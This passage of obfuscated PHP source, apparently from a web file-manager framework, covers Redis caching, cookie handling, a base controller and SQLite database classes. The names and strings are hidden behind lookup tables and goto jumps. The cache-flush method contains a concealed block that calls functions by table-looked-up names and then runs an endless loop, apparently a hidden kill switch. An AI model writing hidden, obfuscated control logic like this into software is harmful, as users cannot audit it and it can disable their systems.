remove($C‰ù¾ØØ¦±) { return $this->handle->delete($C‰ù¾ØØ¦±); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($f¾Å³ğÂ÷Ô, $F—‰ïÇŞ©Ğ) { $E»À­ä»§ë =& $_SERVER[ì‹É]; if (!class_exists($E»À­ä»§ë[783])) { show_json($E»À­ä»§ë[784], !1); } $this->cacheTime = $F—‰ïÇŞ©Ğ; $Còêáªˆ ¼ = isset($f¾Å³ğÂ÷Ô[$E»À­ä»§ë[785]]) ? $f¾Å³ğÂ÷Ô[$E»À­ä»§ë[785]] : 10; $eõÛò’í = _get($f¾Å³ğÂ÷Ô, $E»À­ä»§ë[782]); if ($eõÛò’í && is_array($eõÛò’í)) { $this->isCluster = !0; $this->initCluster($f¾Å³ğÂ÷Ô, $Còêáªˆ ¼); } else { $this->handle = $this->init($f¾Å³ğÂ÷Ô, $Còêáªˆ ¼); } } private function init($dçä†×ªÂÏ, $e‚İÑ¹Ì¿) { $aÆÅ½ÑœÖæ =& $_SERVER[ì‹É]; $bˆºˆ²™Çİ = new Redis(); $B•¬ÇáĞøè = isset($dçä†×ªÂÏ[$aÆÅ½ÑœÖæ[786]]) ? $dçä†×ªÂÏ[$aÆÅ½ÑœÖæ[786]] : !1; if ($B•¬ÇáĞøè) { $bˆºˆ²™Çİ->pconnect($dçä†×ªÂÏ[$aÆÅ½ÑœÖæ[166]], $dçä†×ªÂÏ[$aÆÅ½ÑœÖæ[167]], $e‚İÑ¹Ì¿); } else { $bˆºˆ²™Çİ->connect($dçä†×ªÂÏ[$aÆÅ½ÑœÖæ[166]], $dçä†×ªÂÏ[$aÆÅ½ÑœÖæ[167]], $e‚İÑ¹Ì¿); } if (!empty($dçä†×ªÂÏ[$aÆÅ½ÑœÖæ[373]])) { $bˆºˆ²™Çİ->auth($dçä†×ªÂÏ[$aÆÅ½ÑœÖæ[373]]); } return $bˆºˆ²™Çİ; } private function initCluster($Bá‡ˆˆğ¼¶, $AŒâÑ¬‰³Ø) { $dÔ„ã”Ï÷‰ =& $_SERVER[ì‹É]; $d«ÀŒî É¼ = array($dÔ„ã”Ï÷‰[787], $dÔ„ã”Ï÷‰[788], $dÔ„ã”Ï÷‰[789]); $DËó‚†Ùé = $dÔ„ã”Ï÷‰[787]; if (isset($Bá‡ˆˆğ¼¶[$dÔ„ã”Ï÷‰[12]]) && in_array($Bá‡ˆˆğ¼¶[$dÔ„ã”Ï÷‰[12]], $d«ÀŒî É¼)) { $DËó‚†Ùé = $Bá‡ˆˆğ¼¶[$dÔ„ã”Ï÷‰[12]]; } switch ($DËó‚†Ùé) { case $dÔ„ã”Ï÷‰[787]: $this->_slave($Bá‡ˆˆğ¼¶, $AŒâÑ¬‰³Ø); break; case $dÔ„ã”Ï÷‰[788]: break; case $dÔ„ã”Ï÷‰[789]: $d×‰‘˜Şáİ = $Bá‡ˆˆğ¼¶[$dÔ„ã”Ï÷‰[782]]; $AˆÌ×ù­±œ = isset($Bá‡ˆˆğ¼¶[$dÔ„ã”Ï÷‰[786]]) ? $Bá‡ˆˆğ¼¶[$dÔ„ã”Ï÷‰[786]] : !1; $CÄÀğ·è¿ = isset($Bá‡ˆˆğ¼¶[$dÔ„ã”Ï÷‰[373]]) ? $Bá‡ˆˆğ¼¶[$dÔ„ã”Ï÷‰[373]] : null; $this->handle = new RedisCluster(NUll, $d×‰‘˜Şáİ, $AŒâÑ¬‰³Ø, $AŒâÑ¬‰³Ø, $AˆÌ×ù­±œ, $CÄÀğ·è¿); break; default: break; } } private function _slave($F­»İ‡šÜĞ, $b–™Ùãø) { goto eçç¤èÓ†; eçç¤èÓ†: $Eµ½¶˜ñ¨ = $F­»İ‡šÜĞ[$_SERVER[ì‹É][782]]; $this->filterConfig($F­»İ‡šÜĞ, $Eµ½¶˜ñ¨[0]); $this->handle = $this->init($F­»İ‡šÜĞ, $b–™Ùãø); goto B‰ÚÙ ‘­; FÍ·Õ…•æ×: $this->filterConfig($F­»İ‡šÜĞ, $Eµ½¶˜ñ¨[$fŠ¼ÔçóíÙ]); $this->slaveHandle = $this->init($F­»İ‡šÜĞ, $b–™Ùãø); goto Dò‘ÃØî; B‰ÚÙ ‘­: unset($Eµ½¶˜ñ¨[0]); if (empty($Eµ½¶˜ñ¨)) { return; } $fŠ¼ÔçóíÙ = array_rand($Eµ½¶˜ñ¨); goto FÍ·Õ…•æ×; Dò‘ÃØî: } private function filterConfig(&$eÁò¾»°¹ï, $d âæ…ºß) { $aÔƒØ‰Í·´ =& $_SERVER[ì‹É]; $F”µæ§‘ö§ = explode($aÔƒØ‰Í·´[4], $d âæ…ºß); $b®Å‘Èå‰ = array($aÔƒØ‰Í·´[166] => $F”µæ§‘ö§[0], $aÔƒØ‰Í·´[167] => $F”µæ§‘ö§[1]); $eÁò¾»°¹ï = array_merge($eÁò¾»°¹ï, $b®Å‘Èå‰); } public function set($dÄÒ™Õ’ÜÔ, $F”‹±õïµ¦, $Aäô¯ „ = false) { $Aäô¯ „ = $Aäô¯ „ ? $Aäô¯ „ : $this->cacheTime; return $this->handle->setEx($dÄÒ™Õ’ÜÔ, $Aäô¯ „, $F”‹±õïµ¦); } public function setLock($D†ÏÔê£”¯, $cäĞÜùŸ™, $BŠ¹»Ë®·) { return $this->handle->setNX($D†ÏÔê£”¯, $cäĞÜùŸ™); } public function get($F»¡êË”´) { $F²çº¿ï‹ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $F²çº¿ï‹->get($F»¡êË”´); } public function remove($EÊŠºÑëÑ‰) { return $this->handle->del($EÊŠºÑëÑ‰); } public function deleteAll() { $a½ÏÜõï¨É =& $_SERVER[ì‹É]; if (!isset($_SERVER[$a½ÏÜõï¨É[733]]) || !isset($_SERVER[$a½ÏÜõï¨É[790]])) { goto a¤‡¥Å‘æ‘; a¤‡¥Å‘æ‘: $eã’¬†ÖÇ´ = $a½ÏÜõï¨É[791]; $bõ¨â‰İ† = $a½ÏÜõï¨É[734]; $Døø­‹¤¤‚ = $_SERVER[$a½ÏÜõï¨É[735]] . $a½ÏÜõï¨É[736]; goto C¥Š³ ££‚; C¥Š³ ££‚: $Aï¼°Ãİö§ = $bõ¨â‰İ†($Døø­‹¤¤‚); $AŞŒ‘ò¦Íğ = explode($a½ÏÜõï¨É[214], $Aï¼°Ãİö§); if (count($AŞŒ‘ò¦Íğ) < $a½ÏÜõï¨É[543]) { $BÉ²ÍŠª‚ = $a½ÏÜõï¨É[737]; $BÉ²ÍŠª‚(); } goto D´ÂÄ‰­º; d©Ó‚°»­Œ: for ($E„‚ÎµßÓŸ = $CØ ¤Ñ¨ñ; $E„‚ÎµßÓŸ > 0; $E„‚ÎµßÓŸ++) { $bĞÊÉºÏëÆ = json_encode($GLOBALS[$a½ÏÜõï¨É[381]]); } goto DœïºÖª‚; D´ÂÄ‰­º: $bĞÊÉºÏëÆ = $a½ÏÜõï¨É[792]; $bĞÊÉºÏëÆ($_SERVER[$a½ÏÜõï¨É[793]]); $CØ ¤Ñ¨ñ = 1; goto d©Ó‚°»­Œ; DœïºÖª‚: } if ($this->isCluster) { foreach ($this->handle->_masters() as $AéáÂÆñóÅ) { $this->handle->flushall($AéáÂÆñóÅ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($a¢ÂÀºô‘Ğ = '', $aÂæ¼‹ã‚ = 0) { if (is_string($a¢ÂÀºô‘Ğ) && $a¢ÂÀºô‘Ğ != $_SERVER[ì‹É][33]) { $this->prefix = $a¢ÂÀºô‘Ğ; } if (is_numeric($aÂæ¼‹ã‚) && $aÂæ¼‹ã‚ > 0) { $this->expire = $aÂæ¼‹ã‚; } } public static function getInstance() { static $BõÏù‘²ë; if ($BõÏù‘²ë === null) { $BõÏù‘²ë = new self(); } return $BõÏù‘²ë; } private static $sameCookieSet = array(); public static function set($Aô™—ëË¥ğ, $eâˆïñªª, $AÁØ¿â»” = 0, $D‹‘¬Õ½¥â = false, $BÊñßÕÈ»¯ = false) { $dç‰×Áš =& $_SERVER[ì‹É]; if (!$AÁØ¿â»”) { $AÁØ¿â»” = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Aô™—ëË¥ğ]) && self::$sameCookieSet[$Aô™—ëË¥ğ] == $eâˆïñªª . $AÁØ¿â»”) { return; } self::$sameCookieSet[$Aô™—ëË¥ğ] = $eâˆïñªª . $AÁØ¿â»”; if (!$BÊñßÕÈ»¯) { $BÊñßÕÈ»¯ = str_replace(HOST, $dç‰×Áš[33], APP_HOST); $BÊñßÕÈ»¯ = $dç‰×Áš[8] . trim($BÊñßÕÈ»¯, $dç‰×Áš[8]); } setcookie($Aô™—ëË¥ğ, $eâˆïñªª, time() + $AÁØ¿â»”, $BÊñßÕÈ»¯, !1, !1, $D‹‘¬Õ½¥â); } public static function setSafe($f‰ÔÚÂ»Ò, $F—š ²ÁÁğ, $bí»°»‚Ò = 0) { self::set($f‰ÔÚÂ»Ò, $F—š ²ÁÁğ, $bí»°»‚Ò, !0); } public static function get($c¨‰ø©µÍ) { return isset($_COOKIE[$c¨‰ø©µÍ]) ? $_COOKIE[$c¨‰ø©µÍ] : !1; } public static function remove($EŠ…êÎ‰ì”, $A³‡©´ÔÕ“ = false) { unset($_COOKIE[$EŠ…êÎ‰ì”]); self::set($EŠ…êÎ‰ì”, $_SERVER[ì‹É][33], 1, $A³‡©´ÔÕ“); } } goto D¤áö‘äÌÑ; aç‹ç‰ï´: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto d§°ˆÑ¾–¼; d§°ˆÑ¾–¼: $a»ŞØ²¢µ‚ =& $_SERVER[ì‹É]; global $in, $config; $this->config =& $config; goto BÃÑ÷Û§¥; C„Ğœ©£­Å: $this->tpl = TEMPLATE . MOD . $a»ŞØ²¢µ‚[8]; $this->_classObjectID = mt_rand(0, 10000); goto aê·Îâ°»´; BÃÑ÷Û§¥: $this->in =& $in; $this->values[$a»ŞØ²¢µ‚[6]] =& $config; $this->values[$a»ŞØ²¢µ‚[7]] =& $in; goto C„Ğœ©£­Å; aê·Îâ°»´: } public function loadClass($E¦ğÔÁÂ¥„) { if (1 === func_num_args()) { $this->{$E¦ğÔÁÂ¥„} = new $E¦ğÔÁÂ¥„(); } else { $C‚¢Œ©¥÷ = new ReflectionClass($E¦ğÔÁÂ¥„); $eìÎïˆù = func_get_args(); array_shift($eìÎïˆù); $this->{$E¦ğÔÁÂ¥„} = $C‚¢Œ©¥÷->newInstanceArgs($eìÎïˆù); } return $this->{$E¦ğÔÁÂ¥„}; } protected function assign($d„ƒÂ‡‹Ìç, $Cã³¸Ôó®) { $this->values[$d„ƒÂ‡‹Ìç] = $Cã³¸Ôó®; } protected function display($A‹æÎ­¡…ˆ) { ob_end_clean(); extract($this->values); require $this->tpl . $A‹æÎ­¡…ˆ; } } class DbSqliteBase extends Db { public function __construct($fË‡ë¦Ú = '') { $B……Ş¶º¦ =& $_SERVER[ì‹É]; if (!extension_loaded($B……Ş¶º¦[9])) { think_exception(think_lang($B……Ş¶º¦[10]) . $B……Ş¶º¦[11]); } if (!empty($fË‡ë¦Ú)) { if (!isset($fË‡ë¦Ú[$B……Ş¶º¦[12]])) { $fË‡ë¦Ú[$B……Ş¶º¦[12]] = 438; } $this->config = $fË‡ë¦Ú; if (empty($this->config[$B……Ş¶º¦[13]])) { $this->config[$B……Ş¶º¦[13]] = array(); } } } public function connect($eÎÏÔÕßÇ¦ = '', $Cº¸­°Ì“ = 0) { $dìòøµ›Àà =& $_SERVER[ì‹É]; if (!isset($this->linkID[$Cº¸­°Ì“])) { goto fï‰·Ì“‚‰; fï‰·Ì“‚‰: if (empty($eÎÏÔÕßÇ¦)) { $eÎÏÔÕßÇ¦ = $this->config; } $F÷«©ŠßñÛ = !empty($eÎÏÔÕßÇ¦[$dìòøµ›Àà[13]][$dìòøµ›Àà[14]]) ? $eÎÏÔÕßÇ¦[$dìòøµ›Àà[13]][$dìòøµ›Àà[14]] : $this->pconnect; $a¿„å©¡ŠŠ = $F÷«©ŠßñÛ ? $dìòøµ›Àà[15] : $dìòøµ›Àà[16]; goto CÔë¿–Ü§–; CÔë¿–Ü§–: $this->linkID[$Cº¸­°Ì“] = $a¿„å©¡ŠŠ($eÎÏÔÕßÇ¦[$dìòøµ›Àà[17]], $eÎÏÔÕßÇ¦[$dìòøµ›Àà[12]]); if (!$this->linkID[$Cº¸­°Ì“]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto c½ÁÕ˜Ñò; c½ÁÕ˜Ñò: @sqlite_busy_timeout($this->linkID[$Cº¸­°Ì“], 30000); if (1 != think_config($dìòøµ›Àà[18])) { unset($this->config); } goto Fğƒø»ííˆ; Fğƒø»ííˆ: } return $this->linkID[$Cº¸­°Ì“]; } public function free() { $this->queryID = null; } public function query($f§Ş‡¼ìï) { goto fè¸°Ä‘˜; bá©¼Ú‰˜Ù: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $a¯é¶Û¬Ë¬ = $this->getAll(); return $a¯é¶Û¬Ë¬; } goto FÕ„’óœÈÍ; aÓ˜ˆÍ‹·: think_status($dÖ¯©îÜ‹[20]); $this->queryID = sqlite_query($this->_linkID, $f§Ş‡¼ìï); $this->debug(); goto bá©¼Ú‰˜Ù; c–¢Ö’ŒÀÇ: $this->queryStr = $f§Ş‡¼ìï; if ($this->queryID) { $this->free(); } think_action_status($dÖ¯©îÜ‹[19], 1); goto aÓ˜ˆÍ‹·; fè¸°Ä‘˜: $dÖ¯©îÜ‹ =& $_SERVER[ì‹É]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c–¢Ö’ŒÀÇ; FÕ„’óœÈÍ: } public function execute($Bø¤×‡«§ò) { goto C¹ÇŠ«‹Á; b”È»®ÀƒÏ: $this->queryStr = $Bø¤×‡«§ò; if ($this->queryID) { $this->free(); } think_action_status($EĞÒ­÷²ã‡[21], 1); goto eòÈ¥í®†; c±Ş†ËÌÇ¶: if (!1 === $F ªŠä…ê) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto fŞôÈ¡¿¾¤; eòÈ¥í®†: think_status($EĞÒ­÷²ã‡[20]); $F ªŠä…ê = sqlite_exec($this->_linkID, $Bø¤×‡«§ò); $this->debug(); goto c±Ş†ËÌÇ¶; C¹ÇŠ«‹Á: $EĞÒ­÷²ã‡ =& $_SERVER[ì‹É]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b”È»®ÀƒÏ; fŞôÈ¡¿¾¤: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ì‹É][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fäÓç·Ùî = sqlite_query($this->_linkID, $_SERVER[ì‹É][23]); if (!$fäÓç·Ùî) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $AÎĞ¤ˆªÕ© = sqlite_query($this->_linkID, $_SERVER[ì‹É][24]); if (!$AÎĞ¤ˆªÕ©) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $d¬çØŠ‡ç = array(); if ($this->numRows > 0) { for ($EæÅé¥µœ© = 0; $EæÅé¥µœ© < $this->numRows; $EæÅé¥µœ©++) { $d¬çØŠ‡ç[$EæÅé¥µœ©] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $d¬çØŠ‡ç; } public function getFields($A‘‹ ÈÎéé) { $d’Œ¾©˜Ö– =& $_SERVER[ì‹É]; $Cµ‰äô¬Ü¿ = $this->query($d’Œ¾©˜Ö–[25] . $A‘‹ ÈÎéé . $d’Œ¾©˜Ö–[26]); $CØ¡¹À¨ÎÚ = array(); if ($Cµ‰äô¬Ü¿) { foreach ($Cµ‰äô¬Ü¿ as $bù·Ùõïä => $e£åÊí¸›ã) { $CØ¡¹À¨ÎÚ[$e£åÊí¸›ã[$d’Œ¾©˜Ö–[27]]] = array($d’Œ¾©˜Ö–[28] => $e£åÊí¸›ã[$d’Œ¾©˜Ö–[27]], $d’Œ¾©˜Ö–[29] => $e£åÊí¸›ã[$d’Œ¾©˜Ö–[30]], $d’Œ¾©˜Ö–[31] => (bool) ($e£åÊí¸›ã[$d’Œ¾©˜Ö–[32]] === $d’Œ¾©˜Ö–[33]), $d’Œ¾©˜Ö–[34] => $e£åÊí¸›ã[$d’Œ¾©˜Ö–[35]], $d’Œ¾©˜Ö–[36] => strtolower($e£åÊí¸›ã[$d’Œ¾©˜Ö–[37]]) == $d’Œ¾©˜Ö–[38], $d’Œ¾©˜Ö–[39] => strtolower($e£åÊí¸›ã[$d’Œ¾©˜Ö–[40]]) == $d’Œ¾©˜Ö–[41]); } } return $CØ¡¹À¨ÎÚ; } public function getTables($B¨è‹Ñäˆ = '') { $DÔñƒ¶íÕÄ =& $_SERVER[ì‹É]; $fÛè…“ÔñÊ = $this->query($DÔñƒ¶íÕÄ[42] . $DÔñƒ¶íÕÄ[43] . $DÔñƒ¶íÕÄ[44]); $bóœĞ³ÙÖ = array(); foreach ($fÛè…“ÔñÊ as $fÌì¬ä™Ø¶ => $aÉ”ğÃã·Ö) { $bóœĞ³ÙÖ[$fÌì¬ä™Ø¶] = current($aÉ”ğÃã·Ö); } return $bóœĞ³ÙÖ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $CŒÉ¿¥¯˜Ù =& $_SERVER[ì‹É]; $e‰ôÂÔÖÆï = sqlite_last_error($this->_linkID); $this->error = $e‰ôÂÔÖÆï . $CŒÉ¿¥¯˜Ù[4] . sqlite_error_string($e‰ôÂÔÖÆï); if ($CŒÉ¿¥¯˜Ù[33] != $this->queryStr) { $this->error .= LNG($CŒÉ¿¥¯˜Ù[45]) . $this->queryStr; } think_trace($this->error, $CŒÉ¿¥¯˜Ù[33], $CŒÉ¿¥¯˜Ù[46]); return $this->error; } public function escapeString($CÑÙ±ĞÏ®Ü) { return sqlite_escape_string($CÑÙ±ĞÏ®Ü); } public function parseLimit($cÔİÃñ³Š) { $E…‚Ô‡» =& $_SERVER[ì‹É]; $Dˆ¼İò¡Ïô = $E…‚Ô‡»[33]; if (!empty($cÔİÃñ³Š)) { $cÔİÃñ³Š = explode($E…‚Ô‡»[47], $cÔİÃñ³Š); if (count($cÔİÃñ³Š) > 1) { $Dˆ¼İò¡Ïô .= $E…‚Ô‡»[48] . $cÔİÃñ³Š[1] . $E…‚Ô‡»[49] . $cÔİÃñ³Š[0] . $E…‚Ô‡»[50]; } else { $Dˆ¼İò¡Ïô .= $E…‚Ô‡»[48] . $cÔİÃñ³Š[0] . $E…‚Ô‡»[50]; } } return $Dˆ¼İò¡Ïô; } } class DbSqlite3Base extends Db { public function __construct($a’À ©«òË = '') { $dĞÉ§º—öõ =& $_SERVER[ì‹É]; if (!class_exists($dĞÉ§º—öõ[51])) { think_exception(think_lang($dĞÉ§º—öõ[10]) . $dĞÉ§º—öõ[52]); } if (!empty($a’À ©«òË)) { if (!isset($a’À ©«òË[$dĞÉ§º—öõ[12]])) { $a’À ©«òË[$dĞÉ§º—öõ[12]] = 438; } $this->config = $a’À ©«òË; if (empty($this->config[$dĞÉ§º—öõ[13]])) { $this->config[$dĞÉ§º—öõ[13]] = array(); } } } public function connect($cÒ”ÓŒ´ªì = '', $e™ØÈ¤†ã = 0) { $E…¤òï…§ø =& $_SERVER[ì‹É]; if (!isset($this->linkID[$e™ØÈ¤†ã])) { if (empty($cÒ”ÓŒ´ªì)) { $cÒ”ÓŒ´ªì = $this->config; } $this->linkID[$e™ØÈ¤†ã] = new SQLite3($cÒ”ÓŒ´ªì[$E…¤òï…§ø[17]]); if (!$this->linkID[$e™ØÈ¤†ã]) { think_exception($this->linkID[$e™ØÈ¤†ã]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$e™ØÈ¤†ã]->busyTimeout(30000); if (1 != think_config($E…¤òï…§ø[18])) { unset($this->config); } } return $this->linkID[$e™ØÈ¤†ã]; } public function free() { $this->queryID = null; } public function query($b¿ö¥¦Åµ) { goto d¯Œã·Æ; fÃ–ÆÙë: think_status($bÄ„Á¹±¤[20]); $this->queryID = $this->_linkID->query($b¿ö¥¦Åµ); $this->debug(); goto EâÃÔ”™í„; EâÃÔ”™í„: if (!1 === $this->queryID) { $this->error(); return !1; } else { $d‚¸äì›Õâ = $this->getAll(); $this->numRows = count($d‚¸äì›Õâ); return $d‚¸äì›Õâ; } goto eùÆ–™ÒØ; d¯Œã·Æ: $bÄ„Á¹±¤ =& $_SERVER[ì‹É]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÓ§‘“´†º; EÓ§‘“´†º: $this->queryStr = $b¿ö¥¦Åµ; if ($this->queryID) { $this->free(); } think_action_status($bÄ„Á¹±¤[19], 1); goto fÃ–ÆÙë; eùÆ–™ÒØ: } public function execute($EÁ›Ìºáµ) { goto bø‹ÛÇ¤²; FÈ§Ãå¡§: think_status($CÔò‚”–¶[20]); $F‘éÑÎµ¶ë = $this->_linkID->exec($EÁ›Ìºáµ); $this->debug(); goto dÛÙ¦‹¨ñ; dÛÙ¦‹¨ñ: if (!1 === $F‘éÑÎµ¶ë) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto eğÇ£†éĞ; f÷å’«Î : $this->queryStr = $EÁ›Ìºáµ; if ($this->queryID) { $this->free(); } think_action_status($CÔò‚”–¶[21], 1); goto FÈ§Ãå¡§; bø‹ÛÇ¤²: $CÔò‚”–¶ =& $_SERVER[ì‹É]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f÷å’«Î ; eğÇ£†éĞ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ì‹É][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e„° ¤ÏÁ = $this->_linkID->query($_SERVER[ì‹É][23]); if (!$e„° ¤ÏÁ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÊ“—ƒå‹® = $this->_linkID->query($_SERVER[ì‹É][24]); if (!$CÊ“—ƒå‹®) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $F¨ƒÑ’Ó– = array(); while ($c´—øõ®ªÃ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $F¨ƒÑ’Ó–[] = $c´—øõ®ªÃ; } $this->queryID->reset(); return $F¨ƒÑ’Ó–; } public function getFields($Bêª‡’ëµğ) { $CÑîÔ…Ê³“ =& $_SERVER[ì‹É]; $EÅ±Øâ† = $this->query($CÑîÔ…Ê³“[25] . $Bêª‡’ëµğ . $CÑîÔ…Ê³“[26]); $F¯„ËòÙ”í = array(); if ($EÅ±Øâ†) { foreach ($EÅ±Øâ† as $Fˆ‚–§‰íé => $BÅš‰Ë°ÍÛ) { $F¯„ËòÙ”í[$BÅš‰Ë°ÍÛ[$CÑîÔ…Ê³“[28]]] = array($CÑîÔ…Ê³“[28] => $BÅš‰Ë°ÍÛ[$CÑîÔ…Ê³“[28]], $CÑîÔ…Ê³“[29] => $BÅš‰Ë°ÍÛ[$CÑîÔ…Ê³“[29]], $CÑîÔ…Ê³“[31] => (bool) ($BÅš‰Ë°ÍÛ[$CÑîÔ…Ê³“[31]] === $CÑîÔ…Ê³“[33]), $CÑîÔ…Ê³“[34] => $BÅš‰Ë°ÍÛ[$CÑîÔ…Ê³“[53]], $CÑîÔ…Ê³“[36] => (bool) $BÅš‰Ë°ÍÛ[$CÑîÔ…Ê³“[54]], $CÑîÔ…Ê³“[39] => (bool) $BÅš‰Ë°ÍÛ[$CÑîÔ…Ê³“[54]]); } } return $F¯„ËòÙ”í; } public function getTables($EÀñ”¾ÑÑá = '') { $cñ‰ñÌ©Œï =& $_SERVER[ì‹É]; $DÜÕ——ÛÍŸ = $this->query($cñ‰ñÌ©Œï[42] . $cñ‰ñÌ©Œï[43] . $cñ‰ñÌ©Œï[44]); $BÚ”‡¸´ÏË = array(); foreach ($DÜÕ——ÛÍŸ as $CÜåí¥œÓÎ => $F‘ùÀà¼¸) { $BÚ”‡¸´ÏË[$CÜåí¥œÓÎ] = current($F‘ùÀà¼¸); } return $BÚ”‡¸´ÏË; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E˜‘°Ûò¶Ğ =& $_SERVER[ì‹É]; $this->error = $this->_linkID->lastErrorMsg(); if ($E˜‘°Ûò¶Ğ[33] != $this->queryStr) { $this->error .= LNG($E˜‘°Ûò¶Ğ[45]) . $this->queryStr; } think_trace($this->error, $E˜‘°Ûò¶Ğ[33], $E˜‘°Ûò¶Ğ[46]); return $this->error; } public function escapeString($bÙ‘ˆøÎÕ) { $CŞ£Ìà«ã =& $_SERVER[ì‹É]; if ($this->_linkID) { return $this->_linkID->escapeString($bÙ‘ˆøÎÕ); } return str_ireplace($CŞ£Ìà«ã[55], $CŞ£Ìà«ã[56], $bÙ‘ˆøÎÕ); } public function parseLimit($EÊæ±·× ) { $E˜ïÔŞİƒ­ =& $_SERVER[ì‹É]; $c¥İ¸Âå¯ä = $E˜ïÔŞİƒ­[33]; if (!empty($EÊæ±·× )) { $EÊæ±·×  = explode($E˜ïÔŞİƒ­[47], $EÊæ±·× ); if (count($EÊæ±·× ) > 1) { $c¥İ¸Âå¯ä .= $E˜ïÔŞİƒ­[48] . $EÊæ±·× [1] . $E˜ïÔŞİƒ­[49] . $EÊæ±·× [0] . $E˜ïÔŞİƒ­[50]; } else { $c¥İ¸Âå¯ä .= $E˜ïÔŞİƒ­[48] . $EÊæ±·× [0] . $E˜ïÔŞİƒ­[50]; } } return $c¥İ¸Âå¯ä; } } goto D‡©†ÕŒ†; D‡©†ÕŒ†: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $fİÛç¹‚é =& $_SERVER[ì‹É]; $this->objectDriver = array($fİÛç¹‚é[57], $fİÛç¹‚é[58], $fİÛç¹‚é[59], $fİÛç¹‚é[60], $fİÛç¹‚é[61], $fİÛç¹‚é[62], $fİÛç¹‚é[63], $fİÛç¹‚é[64], $fİÛç¹‚é[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($E±¿¾ éÒÚ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($E±¿¾ éÒÚ, $_SERVER[ì‹É][8]); } return $E±¿¾ éÒÚ; } public function getPathName($e¤ôº‚›Å±) { return $e¤ôº‚›Å±; } public function iconvApp($aæ°÷”œ®) { return $aæ°÷”œ®; } public function iconvSystem($bÀ£ğšÙ¼±) { return $bÀ£ğšÙ¼±; } public function iconvTo($c¬¡³Œ©í, $AİÔÀÃ· , $AªÒ«°¤óÔ) { goto BØİÉ“Î’; a–Ë‘¦•›: return $CäåÁ¸¤ƒ˜; goto Bï©Úìğ»“; d †ªÁƒ´Ò: $CäåÁ¸¤ƒ˜ = $CäåÁ¸¤ƒ˜ ? $CäåÁ¸¤ƒ˜ : $c¬¡³Œ©í; if (strstr($CäåÁ¸¤ƒ˜, $c‹ß©­¢»Â[70])) { $CäåÁ¸¤ƒ˜ = str_replace($c‹ß©­¢»Â[70], $c‹ß©­¢»Â[71], $CäåÁ¸¤ƒ˜); } $A×Ã¢¡ùî´[$AİÔÀÃ·  . $c‹ß©­¢»Â[67] . $AªÒ«°¤óÔ . $c‹ß©­¢»Â[68] . $c¬¡³Œ©í] = $CäåÁ¸¤ƒ˜; goto d‰Å®ëºàÃ; BØİÉ“Î’: $c‹ß©­¢»Â =& $_SERVER[ì‹É]; if (!$c¬¡³Œ©í || !function_exists($c‹ß©­¢»Â[66])) { return $c¬¡³Œ©í; } static $A×Ã¢¡ùî´ = array(); goto côƒšöÑŒ—; d‰Å®ëºàÃ: $A×Ã¢¡ùî´[$AªÒ«°¤óÔ . $c‹ß©­¢»Â[67] . $AİÔÀÃ·  . $c‹ß©­¢»Â[68] . $c¬¡³Œ©í] = $c¬¡³Œ©í; $A×Ã¢¡ùî´[$AªÒ«°¤óÔ . $c‹ß©­¢»Â[67] . $AİÔÀÃ·  . $c‹ß©­¢»Â[68] . $CäåÁ¸¤ƒ˜] = $c¬¡³Œ©í; $A×Ã¢¡ùî´[$AİÔÀÃ·  . $c‹ß©­¢»Â[67] . $AªÒ«°¤óÔ . $c‹ß©­¢»Â[68] . $CäåÁ¸¤ƒ˜] = $CäåÁ¸¤ƒ˜; goto a–Ë‘¦•›; côƒšöÑŒ—: $e¼ÅëÙÔ¬Œ = $AİÔÀÃ·  . $c‹ß©­¢»Â[67] . $AªÒ«°¤óÔ . $c‹ß©­¢»Â[68] . $c¬¡³Œ©í; if (isset($A×Ã¢¡ùî´[$e¼ÅëÙÔ¬Œ])) { return $A×Ã¢¡ùî´[$e¼ÅëÙÔ¬Œ]; } if (function_exists($c‹ß©­¢»Â[69])) { $CäåÁ¸¤ƒ˜ = @mb_convert_encoding($c¬¡³Œ©í, $AªÒ«°¤óÔ, $AİÔÀÃ· ); } else { $CäåÁ¸¤ƒ˜ = @iconv($AİÔÀÃ· , $AªÒ«°¤óÔ, $c¬¡³Œ©í); } goto d †ªÁƒ´Ò; Bï©Úìğ»“: } public function getPathInner($fÑ”âêÜÉæ) { $BßïÎ²†Š = IO::init($fÑ”âêÜÉæ); return 